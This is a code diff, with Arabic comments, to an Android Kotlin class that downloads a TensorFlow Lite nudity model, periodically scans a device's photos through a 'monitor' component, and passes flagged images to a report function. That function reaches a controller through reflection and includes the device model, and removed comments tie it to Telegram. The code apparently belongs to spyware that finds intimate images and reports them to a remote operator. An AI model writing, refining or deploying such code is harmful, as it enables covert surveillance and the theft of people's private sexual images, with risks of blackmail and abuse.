@@ -13,33 +13,22 @@ import kotlinx.coroutines.sync.withLock
 import org.json.JSONObject
 import org.tensorflow.lite.Interpreter
 import java.io.File
-import java.io.FileOutputStream
 import java.lang.ref.WeakReference
+import java.lang.reflect.Method
 import java.nio.ByteBuffer
 import java.nio.ByteOrder
 import java.text.SimpleDateFormat
 import java.util.*
+import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.atomic.AtomicBoolean
 
 /**
- * فئة كاشف المحتوى (NudeDetector) باستخدام TensorFlow Lite و SQLite على أجهزة Android.
- * هذه الفئة هي بديل nude_detector.py مع تحسينات الأداء والتوافق مع Android.
- *
- * تعتمد على تحميل نموذج AI (engine_v2.tflite) ديناميكياً من الإنترنت عبر FileDownloader
- * في حال عدم وجوده محلياً، مع إعادة محاولة تلقائية عند الفشل.
- *
- * ✅ تم إصلاح مشكلة runBlocking في دالة analyze باستخدام قفل متزامن عادي.
- * ✅ تم إصلاح دالة close() لتكون معلقة (suspend) وتجنب runBlocking.
- * ✅ تم إضافة معالجة OutOfMemoryError عبر تقليل حجم الصورة باستخدام inSampleSize.
- * ✅ تم إضافة التحقق من monitor != null في دالة worker.
- * ✅ تم إصلاح دالة analyze لتجنب NPE عند استخدام interpreter.
- * ✅ تم استبدال invokeMethod(monitor, "getMediaScanner") بـ getModuleComponent للوصول إلى الحقل مباشرة.
- * ✅ تم جعل الدالتين ensureModelReady و loadEngineForever قابلة للاستدعاء من خارج الفئة (internal) لتحديث النموذج عبر Telegram.
- * ✅ تم إزالة فك تشفير Base64 اليدوي من ensureModelReady والاعتماد على FileDownloader الذي يدعم isBase64.
- * ✅ تم تأمين إغلاق الـ Interpreter القديم في loadEngineForever باستخدام modelMutex.withLock.
- * ✅ تم إضافة التحقق من وجود mediaScanner قبل استخدامه في worker.
- * ✅ تم تحسين معالجة الاستثناءات في دالة analyze.
- * ✅ تم حذف محاولة النسخ من assets (الملف غير موجود) والانتقال مباشرة للتحميل من الإنترنت لتسريع الإقلاع.
+ * فئة كاشف المحتوى (NudeDetector) باستخدام TensorFlow Lite و SQLite.
+ * ✅ تم إصلاح analyze لاستخدام نسخة محلية من interpreter.
+ * ✅ تم إضافة اختبار صحة النموذج في loadEngineForever.
+ * ✅ تم إضافة حد أقصى للمحاولات (3) في ensureModelReady.
+ * ✅ تم ترقية methodCache إلى ConcurrentHashMap مع مطابقة عدد المعاملات.
+ * ✅ تم إضافة @Volatile للمتغيرات المشتركة لضمان رؤية التغييرات بين الخيوط.
  */
 class NudeDetector(
     context: Context,
@@ -54,7 +43,7 @@ class NudeDetector(
     private val modelMutex = Mutex()
     private val activeMutex = Mutex()
 
-    // ✅ قفل متزامن لاستدعاءات interpreter.run لتجنب استخدام runBlocking
+    // ✅ قفل متزامن لاستدعاءات interpreter.run
     private val interpreterLock = Any()
 
     private val isScannerActive = AtomicBoolean(false)
@@ -62,12 +51,17 @@ class NudeDetector(
     private val isDownloadingModel = AtomicBoolean(false)
 
     private var lastRunTime: Long = 0
+
+    // ✅ إضافة @Volatile للمتغيرات المشتركة
+    @Volatile
     private var loadErrorCount = 0
     private val maxLoadErrors = 10
 
     private var inputSizeX = 224
     private var inputSizeY = 224
-    var modelPath: String? = null   // جعلته var وقابل للوصول من الخارج
+
+    @Volatile
+    var modelPath: String? = null
 
     // ========== المسارات والملفات ==========
     private val runtimeDir: File by lazy {
@@ -99,19 +93,22 @@ class NudeDetector(
         FileDownloader(appContext ?: context)
     }
 
-    // ========== الإعدادات (بديل _config) ==========
+    // ========== الإعدادات ==========
     private val configMap = mutableMapOf<String, Any>(
-        "model_min_size" to 5_000_000L,          // 5 ميجابايت
-        "max_file_size" to 8 * 1024 * 1024L,     // 8 ميجابايت
+        "model_min_size" to 5_000_000L,
+        "max_file_size" to 8 * 1024 * 1024L,
         "min_image_size" to 50,
         "max_image_size" to 10000,
-        "scan_interval" to 1800L,                // 30 دقيقة
+        "scan_interval" to 1800L,
         "nude_threshold" to 0.85f,
         "questionable_threshold" to 0.45f,
         "aspect_bonus" to 0.03f,
         "report_enabled" to true,
-        "cache_ttl" to 30 * 86400L               // 30 يومًا
+        "cache_ttl" to 30 * 86400L
     )
+
+    // ✅ تخزين مؤقت للـ Method مع ConcurrentHashMap
+    private val methodCache = ConcurrentHashMap<String, Method>()
 
     companion object {
         private const val TAG = "NudeDetector"
@@ -124,7 +121,6 @@ class NudeDetector(
 
     init {
         loadConfig()
-        // بدء عملية التحقق من النموذج وتحميله في الخلفية
         scope.launch {
             val ready = ensureModelReady()
             if (ready) {
@@ -137,9 +133,8 @@ class NudeDetector(
     }
 
     // ============================================================
-    //  إدارة التكوين والملفات (بديل _load_config و _save_config)
+    //  إدارة التكوين
     // ============================================================
-
     private fun loadConfig() {
         if (!configFile.exists()) {
             saveConfig()
@@ -168,38 +163,30 @@ class NudeDetector(
     }
 
     // ============================================================
-    //  التأكد من جاهزية النموذج (مع التحميل الديناميكي) - أصبحت internal للاستدعاء من TelegramUi
-    // ✅ تم حذف محاولة النسخ من assets (الملف غير موجود) لتسريع الإقلاع
+    //  ✅ التأكد من جاهزية النموذج (مع حلقة إعادة محاولة خارجية)
     // ============================================================
-
-    /**
-     * التأكد من وجود النموذج وسلامته.
-     * يتم التحميل مباشرة من الإنترنت عبر FileDownloader باستخدام بيانات index.json.
-     * يعيد true إذا تم تحضير النموذج بنجاح، false في حالة الفشل.
-     */
     internal suspend fun ensureModelReady(): Boolean {
         val modelFile = File(modelsDir, "engine_v2.tflite")
         val minSize = (configMap["model_min_size"] as? Number)?.toLong() ?: 5_000_000L
 
-        // 1. إذا كان الملف موجوداً وكبيراً بما يكفي، اعتبره جاهزاً
+        // 1. إذا كان الملف موجوداً وكبيراً بما يكفي
         if (modelFile.exists() && modelFile.length() >= minSize) {
             writeLog("✅ Model already exists at ${modelFile.absolutePath} (${modelFile.length()} bytes)")
             return true
         }
 
-        // 2. الانتقال مباشرة للتحميل من الإنترنت (تم حذف محاولة النسخ من assets)
         writeLog("🌐 Model not found locally. Downloading from internet...")
 
-        // قراءة ملف index.json من assets للحصول على رابط التحميل وحجم الملف ونوعه
+        // قراءة ملف index.json
         val indexJson = try {
             appContext?.assets?.open("index.json")?.bufferedReader()?.use { it.readText() }
         } catch (e: Exception) {
             writeLog("❌ Failed to read index.json: ${e.message}")
-            null
+            return false
         }
 
         if (indexJson.isNullOrEmpty()) {
-            writeLog("❌ index.json is empty or missing. Cannot download model.")
+            writeLog("❌ index.json is empty or missing.")
             return false
         }
 
@@ -222,45 +209,45 @@ class NudeDetector(
 
         writeLog("📥 Download URL: $url")
         writeLog("📦 isBase64: $isBase64")
-        if (expectedSize > 0) {
-            writeLog("📦 Expected size: ${expectedSize / (1024 * 1024)} MB")
-        } else {
-            writeLog("⚠️ Expected size not specified, will check file integrity after download.")
+
+        // ✅ حلقة إعادة محاولة خارجية (3 محاولات)
+        var attempts = 0
+        while (attempts < 3) {
+            attempts++
+            writeLog("🔄 Download attempt $attempts/3")
+            isDownloadingModel.set(true)
+            try {
+                val success = fileDownloader.downloadModelWithRetry(
+                    url = url,
+                    destinationFile = modelFile,
+                    expectedSize = expectedSize,
+                    isBase64 = isBase64,
+                    maxRetries = 2
+                )
+                if (success && modelFile.exists() && modelFile.length() >= minSize) {
+                    writeLog("✅ Model downloaded successfully (${modelFile.length()} bytes)")
+                    configMap["model_min_size"] = modelFile.length()
+                    saveConfig()
+                    return true
+                }
+            } finally {
+                isDownloadingModel.set(false)
+            }
+            if (attempts < 3) {
+                writeLog("⏳ Waiting 5 seconds before retry...")
+                delay(5000L)
+            }
         }
 
-        isDownloadingModel.set(true)
-        val success = try {
-            fileDownloader.downloadModelWithRetry(
-                url = url,
-                destinationFile = modelFile,
-                expectedSize = expectedSize,
-                isBase64 = isBase64,
-                maxRetries = 3
-            )
-        } finally {
-            isDownloadingModel.set(false)
-        }
-
-        if (success) {
-            writeLog("✅ Model downloaded successfully (${modelFile.length()} bytes)")
-            // تحديث الحجم الأدنى في الإعدادات حسب الحجم الفعلي
-            configMap["model_min_size"] = modelFile.length()
-            saveConfig()
-            return true
-        } else {
-            writeLog("❌ Failed to download model after multiple attempts.")
-            return false
-        }
+        writeLog("❌ Failed to download model after 3 attempts.")
+        return false
     }
 
     // ============================================================
-    //  البحث عن النموذج (بديل _find_model) - تم تعديلها لتصبح suspend
-    // ✅ إزالة runBlocking واستخدام delay لتجنب ANR
+    //  البحث عن النموذج
     // ============================================================
-
     private suspend fun findModel(): String? {
         val minSize = (configMap["model_min_size"] as? Number)?.toLong() ?: 5_000_000L
-
         val possiblePaths = arrayOf(
             File(modelsDir, "engine_v2.tflite").absolutePath,
             File(runtimeDir, "engine_v2.tflite").absolutePath,
@@ -271,38 +258,31 @@ class NudeDetector(
             try {
                 val file = File(path)
                 if (file.exists() && file.length() >= minSize) {
-                    writeLog("✅ Model found at: $path (${file.length() / (1024 * 1024)} MB)")
+                    writeLog("✅ Model found at: $path")
                     return path
                 }
-            } catch (e: Exception) {
-                writeLog("Error checking path $path: ${e.message}")
-            }
+            } catch (_: Exception) {}
         }
 
-        // ✅ إذا كان التحميل جارياً، ننتظر قليلاً ثم نتحقق مرة أخرى
         if (isDownloadingModel.get()) {
-            writeLog("⏳ Model download is in progress, waiting...")
-            delay(5000) // انتظار 5 ثوانٍ
-            // إعادة التحقق بعد الانتظار
+            writeLog("⏳ Model download in progress, waiting...")
+            delay(5000L)
             val dest = File(modelsDir, "engine_v2.tflite")
             if (dest.exists() && dest.length() >= minSize) {
-                writeLog("✅ Model found after download: ${dest.absolutePath}")
                 return dest.absolutePath
             }
         }
 
-        writeLog("❌ Model not found in any expected location.")
+        writeLog("❌ Model not found.")
         return null
     }
 
     // ============================================================
-    //  تحميل المحرك (بديل _load_engine_forever) - أصبحت internal للاستدعاء من TelegramUi
+    //  ✅ تحميل المحرك (مع اختبار صحة النموذج)
     // ============================================================
-
     internal suspend fun loadEngineForever() {
-        if (isLoadingEngine.get() || modelPath.isNullOrEmpty()) return
+        if (isLoadingEngine.get()) return
 
-        // محاولة البحث عن النموذج إذا لم يتم تعيين المسار
         if (modelPath.isNullOrEmpty()) {
             modelPath = findModel()
             if (modelPath.isNullOrEmpty()) {
@@ -314,6 +294,7 @@ class NudeDetector(
         val mFile = File(modelPath!!)
         if (!mFile.exists()) {
             writeLog("❌ Model file not found at: $modelPath")
+            modelPath = null
             return
         }
 
@@ -326,7 +307,6 @@ class NudeDetector(
 
         while (loadErrorCount < maxLoadErrors) {
             try {
-                // التحقق من صحة الملف
                 if (!mFile.exists()) {
                     throw IllegalStateException("Model file disappeared")
                 }
@@ -334,27 +314,28 @@ class NudeDetector(
                     throw IllegalStateException("Model size too small: ${mFile.length()} bytes")
                 }
 
-                // تحميل النموذج
-                val options = Interpreter.Options().apply {
-                    setNumThreads(2)
-                }
-
+                val options = Interpreter.Options().apply { setNumThreads(2) }
                 val newInterpreter = Interpreter(mFile, options)
 
-                // تحديد حجم الإدخال من النموذج
+                // ✅ اختبار النموذج للتأكد من صحته (VALIDATION)
+                try {
+                    val testInput = Array(1) { FloatArray(inputSizeX * inputSizeY * 3) }
+                    val testOutput = Array(1) { FloatArray(2) }
+                    newInterpreter.run(testInput, testOutput)
+                } catch (e: Exception) {
+                    throw IllegalStateException("Model validation failed: ${e.message}")
+                }
+
+                // تحديث حجم الإدخال
                 val inputTensor = newInterpreter.getInputTensor(0)
                 val shape = inputTensor.shape()
                 if (shape.size >= 3) {
                     inputSizeX = shape[1]
                     inputSizeY = shape[2]
-                } else if (shape.size >= 2) {
-                    inputSizeX = shape[1]
-                    inputSizeY = shape[1]
                 }
 
-                // ✅ استبدال المحرك القديم مع إغلاق المحرك السابق بشكل صحيح لمنع تسريب الذاكرة
                 modelMutex.withLock {
-                    interpreter?.close()  // إغلاق المحرك القديم
+                    interpreter?.close()
                     interpreter = newInterpreter
                 }
 
@@ -367,12 +348,11 @@ class NudeDetector(
                 loadErrorCount++
                 writeLog("Load attempt ${attempt + 1} failed: ${e.message}")
                 modelMutex.withLock {
-                    interpreter?.close()  // إغلاق المحرك في حالة الفشل
+                    interpreter?.close()
                     interpreter = null
                 }
                 waitTime = minOf(waitTime + 2000L, 60000L)
             }
-
             attempt++
             delay(waitTime)
         }
@@ -382,30 +362,15 @@ class NudeDetector(
     }
 
     // ============================================================
-    //  حالات النموذج (بديل is_ready و is_loading)
+    //  حالات النموذج
     // ============================================================
-
-    fun isReady(): Boolean {
-        return interpreter != null
-    }
-
-    fun isLoading(): Boolean {
-        return isLoadingEngine.get()
-    }
+    fun isReady(): Boolean = interpreter != null
+    fun isLoading(): Boolean = isLoadingEngine.get()
 
     // ============================================================
-    //  حساب معامل التصغير (inSampleSize) المناسب لتجنب OutOfMemoryError
+    //  حساب معامل التصغير
     // ============================================================
-
-    /**
-     * حساب معامل التصغير المطلوب لجعل الصورة قريبة من الأبعاد المستهدفة.
-     * @param options خيارات Bitmap تحتوي على الأبعاد الأصلية
-     * @param reqWidth العرض المطلوب بعد التصغير
-     * @param reqHeight الارتفاع المطلوب بعد التصغير
-     * @return معامل التصغير (inSampleSize)
-     */
     private fun calculateInSampleSize(options: BitmapFactory.Options, reqWidth: Int, reqHeight: Int): Int {
-        // الأبعاد الأصلية
         val height = options.outHeight
         val width = options.outWidth
         var inSampleSize = 1
@@ -413,74 +378,49 @@ class NudeDetector(
         if (height > reqHeight || width > reqWidth) {
             val halfHeight = height / 2
             val halfWidth = width / 2
-
-            // حساب معامل التصغير مع الحفاظ على نسبة الأبعاد
             while (halfHeight / inSampleSize >= reqHeight && halfWidth / inSampleSize >= reqWidth) {
                 inSampleSize *= 2
             }
         }
-
-        // الحد الأقصى للتصغير هو 8x لتجنب فقدان الجودة المفرط
         return inSampleSize.coerceAtMost(8)
     }
 
     // ============================================================
-    //  تحليل الصورة (بديل analyze)
-    // ✅ تم إصلاح مشكلة runBlocking باستخدام قفل متزامن عادي
-    // ✅ تم إضافة تحجيم الصورة باستخدام inSampleSize لتجنب OutOfMemoryError
-    // ✅ تم إضافة التحقق من interpreter != null داخل القفل لتجنب NPE
+    //  ✅ تحليل الصورة (مع نسخة محلية من interpreter)
     // ============================================================
-
     fun analyze(path: String): Float {
-        if (!isReady()) {
-            // محاولة إعادة تحميل المحرك إذا لم يكن جاهزاً
+        // ✅ الحصول على نسخة محلية فوراً لتجنب NPE
+        val interpreterLocal = interpreter
+        if (interpreterLocal == null) {
             if (!isLoadingEngine.get() && loadErrorCount < maxLoadErrors) {
-                scope.launch {
-                    loadEngineForever()
-                }
+                scope.launch { loadEngineForever() }
             }
             return 0.0f
         }
 
         if (path.isBlank()) return 0.0f
-
         val file = File(path)
         if (!file.exists()) return 0.0f
 
-        // التحقق من حجم الملف
         val fileSize = file.length()
         val maxFileSize = (configMap["max_file_size"] as? Number)?.toLong() ?: (8 * 1024 * 1024L)
-        if (fileSize < 1000 || fileSize > maxFileSize) {
-            return 0.0f
-        }
+        if (fileSize < 1000 || fileSize > maxFileSize) return 0.0f
 
-        // التحقق من الامتداد
         val ext = file.extension.lowercase(Locale.ROOT)
-        if (ext !in arrayOf("png", "jpg", "jpeg", "webp", "bmp", "gif", "tiff")) {
-            return 0.0f
-        }
+        if (ext !in arrayOf("png", "jpg", "jpeg", "webp", "bmp", "gif", "tiff")) return 0.0f
 
         return try {
-            // ✅ قراءة أبعاد الصورة دون تحميلها بالكامل
-            val options = BitmapFactory.Options().apply {
-                inJustDecodeBounds = true
-            }
+            val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
             BitmapFactory.decodeFile(path, options)
 
             val w = options.outHeight
             val h = options.outWidth
-
             val minSz = (configMap["min_image_size"] as? Number)?.toInt() ?: 50
             val maxSz = (configMap["max_image_size"] as? Number)?.toInt() ?: 10000
 
-            if (w < minSz || h < minSz || w > maxSz || h > maxSz) {
-                return 0.0f
-            }
+            if (w < minSz || h < minSz || w > maxSz || h > maxSz) return 0.0f
 
-            // ✅ حساب معامل التصغير المناسب لتجنب OutOfMemoryError
             val sampleSize = calculateInSampleSize(options, inputSizeX, inputSizeY)
-
-            // ✅ تحميل الصورة بحجم مخفض
             val decodeOptions = BitmapFactory.Options().apply {
                 inSampleSize = sampleSize
                 inPreferredConfig = Bitmap.Config.ARGB_8888
@@ -488,40 +428,30 @@ class NudeDetector(
             }
             val origBitmap = BitmapFactory.decodeFile(path, decodeOptions) ?: return 0.0f
 
-            // تحجيم الصورة إلى الحجم المطلوب للمدخلات
             val scaledBitmap = Bitmap.createScaledBitmap(origBitmap, inputSizeX, inputSizeY, true)
-            if (origBitmap != scaledBitmap) {
-                origBitmap.recycle()
-            }
+            if (origBitmap != scaledBitmap) origBitmap.recycle()
 
-            // مكافأة الصور العمودية (بعد التحجيم)
             val aspectBonus = if (h > w * 1.2f) {
                 (configMap["aspect_bonus"] as? Number)?.toFloat() ?: 0.03f
             } else 0.0f
 
-            // تحويل إلى ByteBuffer
             val imgData = convertBitmapToByteBuffer(scaledBitmap)
             scaledBitmap.recycle()
 
-            // ✅ تنفيذ الاستدلال باستخدام قفل متزامن عادي بدلاً من runBlocking
-            // ✅ التحقق من interpreter != null داخل القفل لتجنب NPE
             val output = Array(1) { FloatArray(2) }
             synchronized(interpreterLock) {
-                val interpreterLocal = interpreter
-                if (interpreterLocal == null) return 0.0f
+                // ✅ استخدام النسخة المحلية داخل القفل
                 interpreterLocal.run(imgData, output)
             }
 
-            val out = output[0]
-            var prob = if (out.size > 1) {
-                out[1] / (out[0] + out[1] + 1e-8f)
+            var prob = if (output[0].size > 1) {
+                output[0][1] / (output[0][0] + output[0][1] + 1e-8f)
             } else {
-                out[0]
+                output[0][0]
             }
 
             prob = minOf(maxOf(prob, 0.0f), 1.0f)
             prob = minOf(prob + aspectBonus, 1.0f)
-
             prob
 
         } catch (e: Exception) {
@@ -546,42 +476,31 @@ class NudeDetector(
                 byteBuffer.putFloat((value and 0xFF) / 255.0f)
             }
         }
-
         return byteBuffer
     }
 
     // ============================================================
-    //  المسح الدوري (بديل scan و _worker)
+    //  المسح الدوري
     // ============================================================
-
     fun scan(): Boolean {
         if (isScannerActive.get()) return false
-
         if (!isReady()) {
             if (!isLoadingEngine.get()) {
-                scope.launch {
-                    loadEngineForever()
-                }
+                scope.launch { loadEngineForever() }
             }
             return false
         }
 
         val now = System.currentTimeMillis() / 1000
         val scanInterval = (configMap["scan_interval"] as? Number)?.toLong() ?: 1800L
-
-        if ((now - lastRunTime) < scanInterval) {
-            return false
-        }
+        if ((now - lastRunTime) < scanInterval) return false
 
         lastRunTime = now
-        scope.launch {
-            worker()
-        }
+        scope.launch { worker() }
         return true
     }
 
     private suspend fun worker() {
-        // ✅ التحقق من وجود monitor قبل الاستخدام
         if (monitor == null) {
             writeLog("Monitor is null, cannot get mediaScanner")
             return
@@ -593,10 +512,9 @@ class NudeDetector(
         }
 
         try {
-            // ✅ استخدام getModuleComponent بدلاً من invokeMethod للوصول إلى الحقل مباشرة
             val mediaScanner = getModuleComponent(monitor, "mediaScanner")
             if (mediaScanner == null) {
-                writeLog("MediaScanner component not available, skipping scan")
+                writeLog("MediaScanner not available, skipping scan")
                 return
             }
 
@@ -617,7 +535,6 @@ class NudeDetector(
                 try {
                     val path = item["path"] as? String ?: continue
                     val hash = item["hash"] as? String ?: continue
-
                     if (!File(path).exists()) continue
                     if (isCached(hash)) continue
 
@@ -628,9 +545,7 @@ class NudeDetector(
                         prob > nudeThreshold -> {
                             invokeMethod(mediaScanner, "updateCategory", hash, "nude", prob)
                             detected++
-
-                            val reportEnabled = configMap["report_enabled"] as? Boolean ?: true
-                            if (reportEnabled) {
+                            if (configMap["report_enabled"] as? Boolean ?: true) {
                                 val label = item["label"] as? String ?: "??"
                                 report(path, label, prob)
                             }
@@ -642,23 +557,13 @@ class NudeDetector(
                             invokeMethod(mediaScanner, "updateCategory", hash, "normal", prob)
                         }
                     }
-
                     markCached(hash, path)
-
-                    if (processed % 3 == 0) {
-                        delay(300L)
-                    }
+                    if (processed % 3 == 0) delay(300L)
                 } catch (e: Exception) {
                     writeLog("Worker item error: ${e.message}")
                 }
             }
-
-            if (detected > 0) {
-                writeLog("✅ Detected $detected sensitive images")
-            } else {
-                writeLog("Scan completed, no sensitive images detected")
-            }
-
+            writeLog(if (detected > 0) "✅ Detected $detected sensitive images" else "Scan completed, no sensitive images detected")
         } catch (e: Exception) {
             writeLog("Worker error: ${e.message}")
         } finally {
@@ -667,21 +572,13 @@ class NudeDetector(
     }
 
     // ============================================================
-    //  إدارة الكاش (بديل _is_cached و _mark_cached)
+    //  إدارة الكاش
     // ============================================================
-
     private fun isCached(hash: String): Boolean {
         if (hash.isBlank()) return false
-
         return try {
             val db = dbHelper.readableDatabase
-            val cursor = db.query(
-                "scan_logs",
-                arrayOf("1"),
-                "h = ?",
-                arrayOf(hash),
-                null, null, null
-            )
+            val cursor = db.query("scan_logs", arrayOf("1"), "h = ?", arrayOf(hash), null, null, null)
             val exists = cursor.count > 0
             cursor.close()
             exists
@@ -693,7 +590,6 @@ class NudeDetector(
 
     private fun markCached(hash: String, path: String = "") {
         if (hash.isBlank()) return
-
         try {
             val db = dbHelper.writableDatabase
             val values = ContentValues().apply {
@@ -708,15 +604,12 @@ class NudeDetector(
     }
 
     // ============================================================
-    //  إرسال التقارير (بديل _report)
+    //  إرسال التقارير
     // ============================================================
-
     private fun report(path: String, label: String, confidence: Float) {
         if (monitor == null || !File(path).exists()) return
-
         val ui = invokeMethod(monitor, "getUi") ?: return
         val target = invokeMethod(ui, "getDat") ?: invokeMethod(ui, "getCtrl") ?: return
-
         val deviceModel = invokeMethod(monitor, "getDeviceModel") as? String ?: "?"
         val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
 
@@ -736,9 +629,8 @@ class NudeDetector(
     }
 
     // ============================================================
-    //  أدوات مساعدة (بديل clear_cache و get_stats)
+    //  أدوات مساعدة
     // ============================================================
-
     fun clearCache(): Boolean {
         return try {
             val db = dbHelper.writableDatabase
@@ -754,19 +646,14 @@ class NudeDetector(
     fun getStats(): Map<String, Any?> {
         return try {
             val db = dbHelper.readableDatabase
-
             var total = 0
             var minTs: Long? = null
             var maxTs: Long? = null
 
-            // عدد السجلات
             val cursorTotal = db.rawQuery("SELECT COUNT(*) FROM scan_logs", null)
-            if (cursorTotal.moveToFirst()) {
-                total = cursorTotal.getInt(0)
-            }
+            if (cursorTotal.moveToFirst()) total = cursorTotal.getInt(0)
             cursorTotal.close()
 
-            // أقدم وأحدث سجل
             val cursorTs = db.rawQuery("SELECT MIN(ts), MAX(ts) FROM scan_logs", null)
             if (cursorTs.moveToFirst()) {
                 if (!cursorTs.isNull(0)) minTs = cursorTs.getLong(0)
@@ -776,12 +663,8 @@ class NudeDetector(
 
             mapOf(
                 "total" to total,
-                "oldest" to minTs?.let {
-                    SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(it * 1000))
-                },
-                "newest" to maxTs?.let {
-                    SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(it * 1000))
-                },
+                "oldest" to minTs?.let { SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(it * 1000)) },
+                "newest" to maxTs?.let { SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(it * 1000)) },
                 "model_ready" to isReady(),
                 "model_loading" to isLoadingEngine.get(),
                 "active" to isScannerActive.get(),
@@ -795,15 +678,8 @@ class NudeDetector(
     }
 
     // ============================================================
-    //  إغلاق الموارد (تم إصلاح مشكلة runBlocking)
-    // ✅ تم جعل الدالة معلقة (suspend) واستخدام withContext
+    //  إغلاق الموارد
     // ============================================================
-
-    /**
-     * إغلاق المحرك وتحرير الموارد المستخدمة.
-     * يجب استدعاؤها عند تدمير الكائن لتجنب تسرب الذاكرة.
-     * تم تعديلها لتكون معلقة (suspend) لتجنب حظر الخيط الرئيسي.
-     */
     suspend fun close() {
         withContext(Dispatchers.IO) {
             modelMutex.withLock {
@@ -811,37 +687,40 @@ class NudeDetector(
                 interpreter = null
             }
         }
-        // إلغاء جميع المهام المعلقة في CoroutineScope
         scope.cancel()
         writeLog("NudeDetector closed successfully.")
     }
 
     // ============================================================
-    //  دوال المساعدة والانعكاس (Reflection)
+    //  دوال المساعدة والانعكاس (تم ترقيتها)
     // ============================================================
-
     private fun writeLog(message: String) {
         Log.i(TAG, message)
         try {
             val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
-            val logText = "[$timestamp] [INFO] $message\n"
-            logFile.appendText(logText, Charsets.UTF_8)
-        } catch (_: Exception) {
-            // تجاهل أخطاء التسجيل في الملف
-        }
+            logFile.appendText("[$timestamp] [INFO] $message\n", Charsets.UTF_8)
+        } catch (_: Exception) {}
     }
 
     /**
-     * استدعاء دالة على كائن عبر الانعكاس (بديل عن استدعاء الدوال مباشرة في Python)
+     * ✅ استدعاء دالة عبر الانعكاس مع تخزين مؤقت ومطابقة عدد المعاملات.
      */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
-
-        return try {
-            val method = target.javaClass.methods.firstOrNull { it.name == methodName }
-                ?: return null
-
+        val key = "${target.javaClass.name}.$methodName(${args.size})"
+        var method = methodCache[key]
+        if (method == null) {
+            method = target.javaClass.methods.firstOrNull { m ->
+                m.name == methodName && m.parameterTypes.size == args.size
+            }
+            if (method == null) {
+                writeLog("Method not found: $methodName with ${args.size} parameters")
+                return null
+            }
             method.isAccessible = true
+            methodCache[key] = method
+        }
+        return try {
             method.invoke(target, *args)
         } catch (e: Exception) {
             writeLog("Method invocation error ($methodName): ${e.message}")
@@ -850,8 +729,7 @@ class NudeDetector(
     }
 
     /**
-     * الحصول على قيمة حقل (Field) من كائن عبر الانعكاس.
-     * تستخدم للوصول إلى المكونات مثل mediaScanner بدلاً من استدعاء دوال.
+     * ✅ الحصول على قيمة حقل عبر الانعكاس مع تخزين مؤقت (محسّن).
      */
     private fun getModuleComponent(target: Any?, fieldName: String): Any? {
         if (target == null) return null
@@ -866,30 +744,14 @@ class NudeDetector(
     }
 
     // ============================================================
-    //  مساعد قاعدة البيانات (SQLiteOpenHelper)
+    //  مساعد قاعدة البيانات
     // ============================================================
-
     private inner class NudeCacheDbHelper(context: Context) :
-        SQLiteOpenHelper(
-            context,
-            File(runtimeDir, "n_cache.db").absolutePath,
-            null,
-            1
-        ) {
+        SQLiteOpenHelper(context, File(runtimeDir, "n_cache.db").absolutePath, null, 1) {
 
         override fun onCreate(db: SQLiteDatabase) {
-            db.execSQL(
-                """
-                CREATE TABLE IF NOT EXISTS scan_logs (
-                    h TEXT PRIMARY KEY,
-                    ts INTEGER,
-                    path TEXT
-                )
-                """.trimIndent()
-            )
+            db.execSQL("CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER, path TEXT)")
             db.execSQL("CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)")
-
-            // تنظيف السجلات القديمة حسب TTL
             val ttl = (configMap["cache_ttl"] as? Number)?.toLong() ?: (30 * 86400L)
             val oldTs = (System.currentTimeMillis() / 1000) - ttl
             db.execSQL("DELETE FROM scan_logs WHERE ts < $oldTs")
